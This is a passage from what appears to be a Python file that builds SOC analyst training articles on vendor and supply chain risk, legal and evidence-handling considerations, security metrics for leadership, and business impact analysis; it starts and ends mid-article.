### Understanding SOC 2 Reports

| Section | Content | What to Look For |
|---------|---------|-----------------|
| **Section I** | Auditor opinion | Qualified vs. unqualified opinion |
| **Section II** | Management assertion | Scope, system description, TSC covered |
| **Section III** | System description | Architecture, people, procedures, data |
| **Section IV** | Trust service criteria and controls | Control descriptions and test results |
| **Section V** | Exceptions/deviations | Control failures or gaps identified |

### SOC 2 Review Checklist

- [ ] Is the report Type I or Type II? (Type II preferred)
- [ ] Does the audit period cover recent months?
- [ ] Which Trust Service Criteria are included?
- [ ] Are there any qualified opinions?
- [ ] Review Section V for exceptions - are any relevant to your use case?
- [ ] Does the system description match how you use the service?
- [ ] Are subservice organizations included or carved out?
- [ ] Are complementary user entity controls (CUECs) listed?
- [ ] Can you meet the CUECs on your side?

## Right to Audit

### Key Considerations

| Aspect | Guidance |
|--------|---------|
| Contract clause | Include right-to-audit in all vendor contracts for High/Critical tier |
| Scope | Define what can be audited (systems, processes, data handling) |
| Frequency | Typically annually or upon material change |
| Notice period | Usually 30-60 days advance notice |
| Cost allocation | Define who bears audit costs |
| Alternatives | Accept SOC 2 Type II as alternative to direct audit |
| Findings | Define remediation timelines for audit findings |

## Supply Chain Risk

### Supply Chain Attack Vectors

| Vector | Description | Notable Example |
|--------|------------|----------------|
| Software supply chain | Compromised software updates | SolarWinds Orion (2020) |
| Open source dependencies | Malicious packages in repositories | Log4Shell, ua-parser-js |
| Hardware supply chain | Tampered hardware components | Counterfeit network equipment |
| Service provider compromise | Attacker pivots through vendor | Kaseya VSA (2021) |
| Cloud service compromise | Shared infrastructure exploitation | Capital One / misconfigured WAF |
| Certificate authority | Compromised code signing | Stuxnet (stolen certificates) |

### Supply Chain Risk Mitigation

| Control | Implementation |
|---------|---------------|
| Software Bill of Materials (SBOM) | Require SBOM for all critical software |
| Code signing verification | Verify signatures before deploying updates |
| Network segmentation | Isolate vendor access to minimum required |
| Least privilege | Vendor accounts get minimal permissions |
| Monitoring vendor connections | Alert on unusual vendor access patterns |
| Dependency scanning | Scan open source dependencies for vulnerabilities |
| Vendor incident notifications | Require vendors to notify you of their incidents |

## Continuous Vendor Monitoring

### Monitoring Methods

| Method | What It Monitors | Frequency |
|--------|-----------------|-----------|
| Security ratings services | External security posture (BitSight, SecurityScorecard) | Continuous |
| Threat intelligence | Vendor mentions in breach/threat data | Continuous |
| Dark web monitoring | Vendor credentials or data on dark web | Continuous |
| Financial monitoring | Vendor financial health (bankruptcy risk) | Quarterly |
| Compliance monitoring | Certification and audit status | Semi-annually |
| News monitoring | Data breaches, lawsuits, leadership changes | Continuous |
| Technical monitoring | Vendor API/connection behavior | Continuous |

### Vendor Incident Response

When a vendor reports or you detect a vendor-related security incident:

- [ ] Identify which of your systems and data the vendor accesses
- [ ] Assess whether the vendor incident could affect your environment
- [ ] Review vendor access logs for unusual activity during incident period
- [ ] Consider temporarily restricting vendor access until incident is resolved
- [ ] Request vendor's incident report and remediation plan
- [ ] Evaluate whether to notify your customers or regulators
- [ ] Document in your risk register and update vendor risk assessment
- [ ] Review contract for breach notification and liability clauses

## Contract Security Clauses

### Essential Security Contract Terms

| Clause | Purpose | Key Content |
|--------|---------|-------------|
| Data protection | Define data handling obligations | Encryption, classification, retention, disposal |
| Breach notification | Require timely notification of incidents | Notification timeline (24-72 hours), content requirements |
| Right to audit | Allow verification of security controls | Scope, frequency, alternatives (SOC 2) |
| Subcontractor controls | Extend requirements to fourth parties | Flow-down provisions, subcontractor approval |
| Insurance | Require cyber liability coverage | Minimum coverage amounts, named insured |
| Termination | Define data return/destruction at end | Data return format, destruction certification |
| Compliance | Require regulatory compliance | Specific regulations (GDPR, HIPAA, PCI DSS) |
| Liability and indemnification | Allocate risk for security failures | Indemnification for data breaches |
| SLA | Define security service levels | Uptime, patching timeline, incident response time |

## SOC Analyst Practical Guide

### Daily Vendor Monitoring

- [ ] Monitor vendor VPN and API connections for anomalies
- [ ] Alert on vendor account access outside business hours
- [ ] Track vendor account privilege escalation attempts
- [ ] Monitor data transfers to/from vendor-connected systems
- [ ] Correlate vendor access with approved change windows

### Vendor-Related SIEM Rules

| Rule | Trigger | Priority |
|------|---------|----------|
| Vendor account login outside hours | Vendor service account active outside maintenance window | P2 |
| Vendor data export spike | Vendor account downloads 10x normal volume | P2 |
| Vendor privilege escalation | Vendor account attempts admin-level access | P1 |
| Vendor connection from new IP | Vendor connects from previously unseen source | P3 |
| Vendor account brute force | Multiple failed logins on vendor account | P2 |

## Key Takeaways

- Third-party risk is your risk; vendor breaches can become your breaches
- Tier vendors by risk and assess proportionally
- SOC 2 Type II reports are the gold standard for vendor assurance
- Supply chain attacks are increasing; monitor vendor connections actively
- Contract terms are security controls; ensure they are enforceable
- Continuous monitoring is essential; point-in-time assessments are insufficient
- SOC teams should monitor vendor access with the same rigor as internal users
"""
    ))

    # ------------------------------------------------------------------
    # Article 12: Legal and Regulatory Considerations for SOC
    # ------------------------------------------------------------------
    articles.append((
        "Legal and Regulatory Considerations for SOC",
        ["governance", "compliance", "legal", "evidence-handling", "chain-of-custody", "law-enforcement"],
        r"""# Legal and Regulatory Considerations for SOC

## Overview

SOC analysts operate at the intersection of technology and law. Every investigation, every
piece of evidence collected, and every action taken during incident response has potential
legal implications. Understanding legal boundaries protects both the organization and the
analyst from liability.

## Chain of Custody

### What Is Chain of Custody?

Chain of custody is a documented trail showing the seizure, custody, control, transfer,
analysis, and disposition of evidence. It proves evidence was handled properly and was
not tampered with.

### Chain of Custody Requirements

| Requirement | Description | Why It Matters |
|-------------|-----------|---------------|
| Documentation | Record every action taken with evidence | Proves evidence integrity in court |
| Integrity | Prevent alteration or contamination | Evidence can be challenged if tampered |
| Continuity | No gaps in custody record | Gaps raise doubt about evidence reliability |
| Security | Store evidence in controlled environment | Prevents unauthorized access or modification |
| Accountability | Named individual responsible at each step | Clear responsibility for evidence protection |

### Chain of Custody Form Template

| Field | Content |
|-------|---------|
| Case/Incident ID | INC-2026-0042 |
| Evidence ID | EVD-2026-0042-001 |
| Description | Disk image of compromised server SRV-WEB-03 |
| Date/Time Collected | 2026-02-15 14:32 UTC |
| Collected By | Analyst: Jane Smith, Badge #1234 |
| Collection Method | FTK Imager, verified with SHA-256 hash |
| Hash Value | a1b2c3d4e5f6... (SHA-256) |
| Storage Location | Evidence locker, Room 204, Shelf B-3 |

**Transfer Log:**

| Date/Time | From | To | Purpose | Signature |
|-----------|------|-----|---------|-----------|
| 2026-02-15 14:45 | Jane Smith | Evidence Locker | Initial storage | J. Smith |
| 2026-02-16 09:00 | Evidence Locker | Bob Jones | Forensic analysis | B. Jones |
| 2026-02-16 17:00 | Bob Jones | Evidence Locker | Return after analysis | B. Jones |
| 2026-02-20 10:00 | Evidence Locker | Law Enforcement | Transfer to FBI | Det. Williams |

## Evidence Handling

### Digital Evidence Types

| Evidence Type | Source | Collection Method | Volatility |
|--------------|--------|-------------------|-----------|
| Memory dump | RAM | Memory acquisition tool (FTK, WinPmem) | Very High |
| Network traffic | Network tap/SPAN | Packet capture (tcpdump, Wireshark) | Very High |
| Running processes | OS | Process listing and dump | High |
| System logs | OS/Application | Log export or SIEM query | Medium |
| Disk image | Storage media | Forensic imaging (dd, FTK Imager) | Low |
| Email | Mail server | Legal hold, export | Low |
| Cloud logs | Cloud provider | API export, console download | Medium |

### Order of Volatility (collect in this order)

1. CPU registers and cache
2. Memory (RAM)
3. Network state (connections, routing tables)
4. Running processes
5. Disk (temporary files, swap space)
6. Disk (persistent data)
7. Remote logging and monitoring data
8. Archival media (backups, offline storage)

### Evidence Collection Best Practices

- [ ] Use write-blockers when imaging physical media
- [ ] Calculate and record hash values (SHA-256) at collection
- [ ] Verify hash after transfer or copy to confirm integrity
- [ ] Work on forensic copies, never the original evidence
- [ ] Document every tool used and its version
- [ ] Record exact commands executed during collection
- [ ] Note the time source used and any clock skew observed
- [ ] Photograph physical evidence before and during collection
- [ ] Use tamper-evident bags for physical media

## Legal Hold and Preservation

### What Is a Legal Hold?

A legal hold (litigation hold) is a notification requiring the preservation of all
relevant documents, records, and data when litigation is reasonably anticipated.

### Legal Hold Process

```
Legal hold trigger identified
  |-> Legal department issues hold notice
  |-> IT/Security identifies relevant data and systems
  |-> Preservation actions implemented:
  |    - Suspend automated deletion/retention policies
  |    - Preserve email accounts (journaling or archive)
  |    - Image relevant systems
  |    - Preserve log data beyond normal retention
  |    - Preserve cloud data and snapshots
  |-> Document all preservation actions
  |-> Confirm receipt of hold notice by custodians
  |-> Maintain hold until legal releases it
```

### SOC Responsibilities During Legal Hold

| Action | Details |
|--------|---------|
| Preserve logs | Extend retention for relevant log sources beyond standard policy |
| Preserve evidence | Do not destroy, modify, or overwrite any potentially relevant data |
| Document actions | Record all investigative steps and evidence handling |
| Coordinate with legal | All evidence requests go through legal counsel |
| Limit access | Restrict access to preserved data to authorized personnel |
| Monitor for spoliation | Watch for attempts to destroy relevant evidence |

## Law Enforcement Coordination

### When to Engage Law Enforcement

| Scenario | Engage Law Enforcement? | Agency |
|----------|------------------------|--------|
| Ransomware attack | Yes (recommended) | FBI IC3, local FBI field office |
| Data breach with PII | Often required by law | FBI, state AG, sector-specific |
| Insider threat (criminal) | Yes | FBI, local law enforcement |
| Nation-state activity | Yes | FBI, CISA |
| Child exploitation material | Yes (mandatory) | FBI, NCMEC |
| Wire fraud / BEC | Yes (especially if funds recoverable) | FBI, Secret Service |
| DDoS attack | Case-by-case | FBI |
| IP theft | Case-by-case | FBI |

### Law Enforcement Coordination Best Practices

- [ ] Establish relationships with local FBI field office before an incident
- [ ] Have legal counsel involved in all law enforcement interactions
- [ ] Never share more than necessary or approved by legal
- [ ] Understand that law enforcement investigation may take months or years
- [ ] Do not delay containment/remediation waiting for law enforcement approval
- [ ] Preserve evidence in a manner admissible in court
- [ ] Maintain separate copies of evidence for internal and law enforcement use
- [ ] Document all interactions with law enforcement

## Privacy During Investigations

### Balancing Security and Privacy

| Activity | Privacy Consideration | Mitigation |
|----------|----------------------|-----------|
| Email monitoring | Employee privacy expectations | Clear AUP stating monitoring rights |
| Endpoint forensics | Personal files on work devices | Limit scope to business-relevant data |
| Network monitoring | Capturing personal communications | Minimize capture of non-relevant traffic |
| Interview/investigation | Employee rights and HR policy | Involve HR, follow investigation procedures |
| BYOD forensics | Personal device, mixed data | Clear BYOD policy with consent to search |
| Cross-border investigation | Different privacy laws per jurisdiction | Consult legal for each jurisdiction |

### Key Privacy Boundaries for SOC Analysts

- **DO** monitor systems in accordance with published policies
- **DO** document that monitoring policies were in place before investigation
- **DO** limit investigation scope to business-relevant data
- **DO** involve HR and legal in employee investigations
- **DO NOT** read personal emails without legal approval
- **DO NOT** access personal files unrelated to the investigation
- **DO NOT** share investigation details with unauthorized personnel
- **DO NOT** conduct investigations outside your authorized scope

## Cross-Border Data Issues

### Key Challenges

| Issue | Description | Impact on SOC |
|-------|-----------|---------------|
| Data residency | Laws requiring data to stay in-country | Log storage location matters |
| Data transfer restrictions | GDPR limits on EU data transfers | Cannot freely move EU logs to US SIEM |
| Conflicting laws | One country requires disclosure, another prohibits | Legal must adjudicate conflicts |
| Jurisdictional authority | Which country's laws apply? | Determines investigative boundaries |
| Mutual Legal Assistance Treaties | Formal government-to-government data sharing | Slow process for law enforcement |

### Cross-Border SOC Considerations

- Know where your SIEM data is stored and processed
- Understand data transfer mechanisms in place (SCCs, adequacy decisions)
- Consult legal before sharing incident data across borders
- Be aware that evidence handling requirements differ by jurisdiction
- Some jurisdictions require local law enforcement notification

## SOC Legal Pitfalls

### Common Mistakes to Avoid

| Pitfall | Risk | Prevention |
|---------|------|-----------|
| Accessing systems without authorization | Criminal liability (CFAA) | Always have documented authorization |
| Destroying evidence during investigation | Spoliation, obstruction | Implement evidence preservation procedures |
| Sharing incident details publicly | Defamation, breach of confidentiality | All external comms through approved channels |
| Conducting hack-back operations | Criminal liability, international law | Never attempt offensive actions |
| Overly broad monitoring | Privacy violations | Scope monitoring to published policies |
| Failing to report mandatory breaches | Regulatory penalties | Know reporting obligations and timelines |
| Ignoring legal holds | Court sanctions, adverse inference | Establish clear legal hold procedures |
| Poor documentation | Evidence inadmissible | Document everything contemporaneously |

### Authorization Documentation

Maintain written documentation of your authority to:

- [ ] Access and monitor systems in scope
- [ ] Collect and preserve digital evidence
- [ ] Conduct investigations on organizational systems
- [ ] Engage external parties (forensic firms, law enforcement)
- [ ] Take containment actions (isolate hosts, block IPs)
- [ ] Access specific data stores for investigation purposes

## Key Takeaways

- Chain of custody makes or breaks evidence admissibility; document everything
- Collect volatile evidence first; you cannot recover what is lost
- Legal holds override normal data retention; never delete data under hold
- Establish law enforcement relationships before you need them
- Privacy laws limit your investigative scope; always involve legal counsel
- Cross-border investigations are complex; consult legal before sharing data
- Authorization to act is essential; never assume permission
- When in doubt, call legal before proceeding
"""
    ))

    # ------------------------------------------------------------------
    # Article 13: Security Metrics and Reporting for Leadership
    # ------------------------------------------------------------------
    articles.append((
        "Security Metrics and Reporting for Leadership",
        ["governance", "risk", "metrics", "reporting", "kpi", "security-metrics"],
        r"""# Security Metrics and Reporting for Leadership

## Overview

Security metrics translate technical security operations into business-relevant information
that leadership can use to make informed risk decisions. SOC analysts generate the raw data
that feeds these metrics. Understanding what matters to leadership helps you prioritize your
work and communicate your value effectively.

## Meaningful Security Metrics

### Operational Metrics (SOC Performance)

| Metric | Definition | How to Calculate | Target |
|--------|-----------|-----------------|--------|
| **MTTD** | Mean Time to Detect | Average time from intrusion to detection | < 24 hours |
| **MTTR** | Mean Time to Respond | Average time from detection to containment | < 4 hours |
| **MTTC** | Mean Time to Contain | Average time from detection to full containment | < 8 hours |
| **MTTRE** | Mean Time to Remediate | Average time from detection to full remediation | < 72 hours |
| **Alert Volume** | Total alerts per period | Count from SIEM | Trending down with tuning |
| **True Positive Rate** | Percentage of alerts that are real | True positives / Total alerts | > 80% |
| **False Positive Rate** | Percentage of alerts that are noise | False positives / Total alerts | < 20% |
| **Escalation Rate** | Alerts escalated to Tier 2/3 | Escalated / Total investigated | 10-30% |
| **Alert-to-Incident Ratio** | How many alerts become incidents | Incidents / Alerts | Depends on environment |

### Risk Metrics (Business Alignment)

| Metric | Definition | How to Calculate | Audience |
|--------|-----------|-----------------|---------|
| **Risk Reduction** | Change in organizational risk posture | Risk score delta over time | Board/Exec |
| **Vulnerability Age** | Average age of open vulnerabilities | Mean days from discovery to remediation | CISO/CTO |
| **Patching Cadence** | Time to patch after release | Mean days from patch release to deployment | CISO/IT |
| **Coverage Gaps** | Assets without security monitoring | Unmonitored assets / Total assets | CISO |
| **Control Effectiveness** | How well controls perform | Incidents prevented / Total attempts | CISO/Board |
| **Cyber Risk Quantification** | Financial risk exposure | ALE calculations for top risks | Board/CFO |
| **Third-Party Risk Score** | Aggregate vendor risk posture | Weighted average of vendor risk scores | CISO |

### Compliance Metrics

| Metric | Definition | Target |
|--------|-----------|--------|
| Policy compliance rate | Systems meeting policy requirements | > 95% |
| Audit finding closure rate | Open findings remediated on time | > 90% |
| Training completion rate | Employees completed required training | > 95% |
| Regulatory reporting timeliness | Reports filed within deadlines | 100% |
| Control assessment currency | Controls assessed within schedule | > 90% |

## Vanity Metrics to Avoid

| Vanity Metric | Why It Is Misleading | Better Alternative |
|--------------|---------------------|-------------------|
| Total alerts blocked | High number means noisy environment, not good security | True positive rate + MTTD |
| Number of attacks stopped | Vague, hard to verify, inflated by counting noise | Incidents by severity + business impact |
| Vulnerabilities found | More vulns found may mean poor patching, not good scanning | Vulnerability age + remediation rate |
| Phishing emails blocked | High count normal for any organization | Click rate + report rate from simulations |
| Firewall rules count | More rules often means more complexity, not more security | Rules mapped to business justification |
| Uptime percentage alone | 99.9% uptime ignores security posture | Uptime + security incident impact on availability |
| Tickets closed | Volume without quality is meaningless | Resolution quality + recurrence rate |

## Dashboard Design

### Dashboard Hierarchy

| Level | Audience | Update Frequency | Focus |
|-------|---------|-----------------|-------|
| **Executive Dashboard** | Board, CEO, CFO | Monthly/Quarterly | Risk posture, business impact, trends |
| **CISO Dashboard** | CISO, security leadership | Weekly | Program health, operational metrics, compliance |
| **SOC Manager Dashboard** | SOC Manager, team leads | Daily | Alert volume, SLA compliance, analyst workload |
| **SOC Analyst Dashboard** | Individual analysts | Real-time | Queue, active incidents, IOC feeds |

### Executive Dashboard Components

| Component | Content | Visualization |
|-----------|---------|-------------|
| Overall risk score | Single number or rating | Gauge or stoplight (red/yellow/green) |
| Top 5 risks | Highest-rated risks from register | Heat map or ranked list |
| Incident trend | Incidents over time by severity | Line chart (12-month trend) |
| MTTD/MTTR trend | Detection and response speed | Line chart showing improvement |
| Compliance status | Audit findings and compliance score | Stoplight per framework |
| Program milestones | Key security initiatives progress | Gantt or milestone chart |

### Design Principles

| Principle | Description |
|-----------|------------|
| Answer "so what?" | Every metric should answer why leadership should care |
| Show trends, not just snapshots | Direction matters more than absolute numbers |
| Use consistent scales | Same color coding and rating scales across dashboards |
| Keep it to one page | Executives will not read multi-page reports |
| Provide context | Compare to industry benchmarks or previous periods |
| Link to business impact | Frame security in terms of revenue, reputation, compliance |
| Include action items | Every metric should suggest what to do next |

## Reporting to Executives

### Monthly Security Report Template

```
Executive Security Report - [Month Year]

1. EXECUTIVE SUMMARY (2-3 sentences)
   - Overall risk posture: [Improved/Stable/Degraded]
   - Key highlight: [Biggest achievement or concern]
   - Action required: [Decision or resource needed from leadership]

2. RISK POSTURE
   - Current risk score: X/100
   - Change from last month: +/- Y
   - Top 3 risk changes and why

3. INCIDENT SUMMARY
   - Total incidents: X (P1: _, P2: _, P3: _, P4: _)
   - Notable incidents: [Brief description of significant events]
   - Trend: [Up/Down/Stable compared to previous period]

4. KEY METRICS
   - MTTD: X hours (target: Y hours)
   - MTTR: X hours (target: Y hours)
   - Vulnerability age (critical): X days (target: Y days)
   - Patching compliance: X% (target: Y%)

5. COMPLIANCE STATUS
   - [Framework]: [Status] - [Key finding or achievement]
   - Open audit findings: X (Critical: _, High: _, Medium: _)

6. PROGRAM INITIATIVES
   - [Initiative 1]: [Status] - [Key milestone]
   - [Initiative 2]: [Status] - [Key milestone]

7. RESOURCE REQUESTS
   - [Specific ask with business justification]

8. LOOK AHEAD
   - Upcoming risks or events to monitor
   - Planned activities for next period
```

### Presentation Tips for Executives

| Do | Do Not |
|----|--------|
| Start with business impact | Start with technical details |
| Use plain language | Use jargon or acronyms without explanation |
| Show trends and comparisons | Show raw numbers without context |
| Provide recommendations | Present problems without solutions |
| Quantify risk in dollars when possible | Use only qualitative descriptions |
| Keep it under 15 minutes | Talk for 45 minutes |
| Prepare for "so what?" questions | Assume they understand technical implications |
| Bring specific asks (budget, policy, support) | Present information without a call to action |

## Risk-Based Reporting

### Translating Technical Metrics to Business Risk

| Technical Finding | Business Translation | Risk Statement |
|------------------|---------------------|---------------|
| 45 critical vulnerabilities unpatched | 45 internet-facing systems exploitable by attackers | $2.4M potential loss from data breach |
| MTTD increased from 4 hrs to 12 hrs | Attackers have 3x longer to operate undetected | Increased probability of significant breach |
| 3 failed phishing simulations by finance | Finance team susceptible to wire fraud | Potential for $500K+ BEC loss |
| Vendor SOC 2 report has exceptions | Key vendor has security control gaps | Supply chain compromise risk elevated |
| 60% of endpoints missing latest patches | Majority of workstations vulnerable to known exploits | Ransomware outbreak risk is elevated |

### Communicating Bad News

```
Framework for delivering bad security news to executives:

1. STATE the situation clearly and concisely
   "We discovered X that exposes us to Y risk"

2. QUANTIFY the risk in business terms
   "This could result in Z dollars/days of downtime/regulatory impact"

3. EXPLAIN what you have already done
   "We have taken A, B, C actions to reduce immediate risk"

4. PROPOSE next steps with options
   "Option 1 costs $X and reduces risk by Y%
    Option 2 costs $X and reduces risk by Y%"

5. REQUEST what you need
   "We need budget/approval/support for [specific ask]"
```

## Building a Metrics Program

### Implementation Roadmap

| Phase | Timeline | Activities |
|-------|---------|-----------|
| 1. Foundation | Month 1-2 | Define key metrics, identify data sources, set baselines |
| 2. Collection | Month 2-3 | Automate data collection, build initial dashboards |
| 3. Reporting | Month 3-4 | Create report templates, establish reporting cadence |
| 4. Refinement | Month 4-6 | Gather feedback, adjust metrics, improve visualizations |
| 5. Maturity | Month 6+ | Add benchmarking, predictive metrics, risk quantification |

### Metrics Data Sources

| Data Source | Metrics Provided |
|-------------|-----------------|
| SIEM | Alert volume, MTTD, true/false positive rates |
| Ticketing system | MTTR, incident counts, SLA compliance |
| Vulnerability scanner | Vulnerability counts, age, remediation rates |
| EDR | Endpoint health, detection counts, response times |
| Patch management | Patching cadence, compliance rates |
| Training platform | Completion rates, phishing simulation results |
| GRC platform | Compliance scores, audit findings, risk register |
| Asset management | Coverage gaps, inventory accuracy |

## Key Takeaways

- Measure what matters to the business, not just what is easy to count
- Trends and direction are more valuable than absolute numbers
- Every metric should answer "so what?" for its audience
- Avoid vanity metrics that look impressive but do not drive decisions
- Frame security in business terms: revenue, reputation, regulatory risk
- Executive reporting should be concise, visual, and action-oriented
- SOC analysts generate the data; understanding metrics makes your work more impactful
"""
    ))

    # ------------------------------------------------------------------
    # Article 14: Business Impact Analysis Practical Guide
    # ------------------------------------------------------------------
    articles.append((
        "Business Impact Analysis Practical Guide",
        ["governance", "risk", "business-impact-analysis", "bia", "business-continuity"],
        r"""# Business Impact Analysis Practical Guide

## Overview

A Business Impact Analysis (BIA) identifies an organization's critical business functions
and the impact of their disruption. The BIA is the foundation of business continuity and
disaster recovery planning. SOC analysts benefit from understanding the BIA because it
defines which assets, systems, and processes are most critical to the business.

## How to Conduct a BIA

### BIA Process Overview

```
Phase 1: Planning and Scoping
  |-> Define BIA objectives and scope
  |-> Identify stakeholders and interview schedule
  |-> Prepare questionnaires and templates

Phase 2: Data Collection
  |-> Conduct stakeholder interviews
  |-> Distribute and collect questionnaires
  |-> Review existing documentation

Phase 3: Analysis
  |-> Identify critical business functions
  |-> Map dependencies (systems, people, vendors)
  |-> Determine impact over time
  |-> Establish RTO, RPO, and priorities

Phase 4: Documentation
  |-> Compile BIA report
  |-> Validate findings with stakeholders
  |-> Present to leadership for approval

Phase 5: Maintenance
  |-> Review annually or after significant changes
  |-> Update when new systems or processes are added
```

### Timeline

| Phase | Duration | Key Activities |
|-------|---------|---------------|
| Planning | 1-2 weeks | Scope, stakeholder identification, scheduling |
| Data Collection | 2-4 weeks | Interviews, questionnaires, document review |
| Analysis | 1-2 weeks | Impact assessment, dependency mapping |
| Documentation | 1 week | Report writing, validation |
| Approval | 1-2 weeks | Leadership review and sign-off |
| **Total** | **6-11 weeks** | **For a mid-size organization** |

## Identifying Critical Business Functions

### Business Function Inventory

| Department | Business Function | Description | Revenue Impact |
|-----------|------------------|-------------|---------------|
| Sales | Order processing | Receiving and fulfilling customer orders | Direct |
| Finance | Payroll processing | Employee compensation | Indirect |
| Finance | Accounts receivable | Invoice collection | Direct |
| IT | Email and communication | Business communication platform | Indirect |
| Operations | Manufacturing | Product production | Direct |
| Customer Service | Support desk | Customer issue resolution | Indirect |
| Legal | Contract management | Legal agreement processing | Indirect |
| HR | Recruitment | Hiring new employees | Indirect |

### Criticality Rating

| Rating | Description | Impact if Disrupted | Example |
|--------|-----------|-------------------|---------|
| **Mission Critical** | Essential for survival | Immediate severe impact | Payment processing |
| **Business Critical** | Essential for core operations | Significant impact within hours | Email, CRM |
| **Business Important** | Supports key processes | Moderate impact within days | HR systems, reporting |
| **Administrative** | Supports general operations | Minor impact within weeks | Internal wiki, training LMS |

## Dependency Mapping

### System Dependency Matrix

| Business Function | Applications | Infrastructure | Data | External Vendors | People |
|------------------|-------------|---------------|------|-----------------|--------|
| Order Processing | ERP, CRM, e-commerce | Web servers, DB cluster | Customer DB, inventory | Payment gateway, shipping | Sales team, warehouse |
| Payroll | HRIS, payroll system | Payroll server, DB | Employee records, tax data | Bank, tax service | HR, finance team |
| Customer Support | Ticketing, knowledge base | App servers, phone system | Customer history, FAQs | Telephony provider | Support agents |

### Dependency Diagram Approach

```
[Business Function: Order Processing]
  |
  |-- Application: E-commerce Platform
  |     |-- Server: web-prod-01, web-prod-02
  |     |-- Database: db-orders (primary), db-orders (replica)
  |     |-- Network: Internet link, load balancer
  |
  |-- Application: ERP System
  |     |-- Server: erp-prod-01
  |     |-- Database: db-erp
  |     |-- Integration: API to e-commerce
  |
  |-- External: Payment Gateway (Stripe)
  |     |-- API connectivity required
  |     |-- SLA: 99.95% uptime
  |
  |-- External: Shipping Provider (FedEx API)
  |     |-- API connectivity required
  |     |-- SLA: 99.9% uptime
  |
  |-- People: Sales team (5), Warehouse team (10)
  |     |-- Minimum staffing: 2 sales, 4 warehouse
```

## Determining RTO and RPO

### RTO Decision Framework

| Question | Answer Drives RTO |
|----------|------------------|
| How quickly will revenue be impacted? | Shorter RTO for direct revenue functions |
| Are there regulatory deadlines? | Regulatory requirements may mandate specific RTOs |
| Can the function be performed manually? | Manual workaround extends acceptable RTO |
| What is the customer impact? | Higher customer impact requires shorter RTO |
| What is the contractual obligation? | SLA commitments constrain RTO |

### RTO/RPO Assignment Guide

| Function Criticality | Typical RTO | Typical RPO | DR Strategy |
|---------------------|-------------|-------------|-------------|
| Mission Critical | 0-4 hours | 0-1 hour | Hot site, real-time replication |
| Business Critical | 4-24 hours | 1-4 hours | Warm site, frequent backups |
| Business Important | 1-3 days | 4-24 hours | Warm/cold site, daily backups |
| Administrative | 3-7 days | 24-72 hours | Cold site, periodic backups |

### Impact Over Time Analysis

| Time Without Function | Order Processing | Email | Payroll | Website |
|----------------------|-----------------|-------|---------|---------|
| 0-1 hour | $50K lost orders | Minimal | None | Minor annoyance |
| 1-4 hours | $200K + customer churn | Moderate disruption | None | Customer complaints |
| 4-8 hours | $500K + SLA breaches | Significant productivity loss | None | Media attention |
| 8-24 hours | $1.5M + contract penalties | Critical business impact | Possible if payday | Brand damage |
| 1-3 days | $5M + regulatory scrutiny | Severe operational impact | Employee hardship | Major brand damage |
| 3+ days | Potential business failure | Potential business failure | Legal liability | Customer exodus |

## Financial Impact Assessment

### Cost Categories

| Category | Description | Calculation Method |
|----------|------------|-------------------|
| **Lost Revenue** | Direct revenue not earned during outage | Revenue per hour x downtime hours |
| **Productivity Loss** | Employee time wasted or idle | Hourly rate x affected employees x hours |
| **Recovery Costs** | Expenses to restore operations | Labor, equipment, vendor fees, overtime |
| **Regulatory Fines** | Penalties for non-compliance | Per regulation (GDPR, PCI, etc.) |
| **Customer Compensation** | SLA credits, refunds, goodwill | Per contract/SLA terms |
| **Reputational Damage** | Long-term customer and brand impact | Customer churn rate x lifetime value |
| **Legal Costs** | Litigation, settlements | Case-by-case estimation |

### Financial Impact Worksheet

| Cost Category | Hour 1 | Hour 4 | Hour 8 | Day 1 | Day 3 |
|--------------|--------|--------|--------|-------|-------|
| Lost Revenue | $50K | $200K | $500K | $1.5M | $5M |
| Productivity | $5K | $20K | $40K | $120K | $360K |
| Recovery | $2K | $10K | $25K | $75K | $200K |
| Penalties | $0 | $0 | $50K | $200K | $500K |
| Compensation | $0 | $10K | $50K | $150K | $500K |
| **Total** | **$57K** | **$240K** | **$665K** | **$2.05M** | **$6.56M** |

## BIA Interview Techniques

### Interview Preparation

| Step | Activity |
|------|---------|
| 1 | Identify the right interviewees (process owners, not just managers) |
| 2 | Send questionnaire in advance so interviewees can prepare |
| 3 | Schedule 60-90 minutes per interview |
| 4 | Prepare specific questions for each business function |
| 5 | Bring a note-taker so you can focus on the conversation |

### Sample Interview Questions

| Category | Questions |
|----------|----------|
| Function overview | What does your team do? What are your key deliverables? |
| Peak periods | Are there critical periods (month-end, quarter-end, seasonal)? |
| Dependencies | What systems, applications, and vendors do you depend on? |
| Staffing | How many people perform this function? Minimum staffing needed? |
| Manual workarounds | If systems are down, can you work manually? For how long? |
| Impact timing | At what point does a disruption become a serious problem? |
| Data requirements | How much data loss can you tolerate? (hours, days?) |
| Recovery priority | What should be restored first? Second? Third? |
| Past incidents | Have you experienced disruptions? What happened? |
| Upstream/downstream | Who depends on your output? Whose input do you need? |

### Interview Tips

- [ ] Start by explaining the purpose and how results will be used
- [ ] Use business language, not technical jargon
- [ ] Ask for worst-case scenarios, not average cases
- [ ] Validate financial estimates with finance department
- [ ] Look for hidden dependencies the interviewee may not mention
- [ ] Cross-reference answers between departments
- [ ] Follow up on vague answers with specific examples
- [ ] Record interviews (with permission) for accuracy

## BIA Report Template

```
Business Impact Analysis Report

1. EXECUTIVE SUMMARY
   - Scope and methodology
   - Key findings
   - Top 5 critical business functions
   - Recommended RTO/RPO summary

2. METHODOLOGY
   - Data collection methods
   - Stakeholders interviewed
   - Assumptions and limitations

3. BUSINESS FUNCTION ANALYSIS
   For each function:
   - Description and owner
   - Criticality rating
   - Dependencies (systems, people, vendors)
   - Impact over time (financial and operational)
   - Recommended RTO and RPO
   - Manual workaround capability

4. DEPENDENCY MAP
   - System dependency matrix
   - Vendor dependency summary
   - Single points of failure identified

5. RECOVERY PRIORITIES
   - Ordered list of recovery priorities
   - Justification for priority order
   - Resource requirements per priority tier

6. GAP ANALYSIS
   - Current recovery capabilities vs. required RTO/RPO
   - Gaps requiring investment or process changes

7. RECOMMENDATIONS
   - Prioritized list of actions
   - Estimated costs and timelines
   - Risk of inaction

8. APPENDICES
   - Detailed interview notes
   - Financial impact worksheets
   - System inventory
```

## SOC Analyst Practical Applications

### How BIA Informs SOC Operations

| BIA Output | SOC Application |
|-----------|----------------|
| Critical business functions | Prioritize monitoring for systems supporting these functions |
| RTO requirements | Set alert SLAs aligned to business criticality |
| System dependencies | Understand blast radius of incidents |
| Vendor dependencies | Monitor vendor connections supporting critical functions |
| Financial impact data | Quantify incident severity for escalation decisions |
| Single points of failure | Focus detection on high-risk systems |

### Using BIA Data in Incident Response

- [ ] Reference BIA when determining incident priority
- [ ] Use financial impact data to justify escalation to management
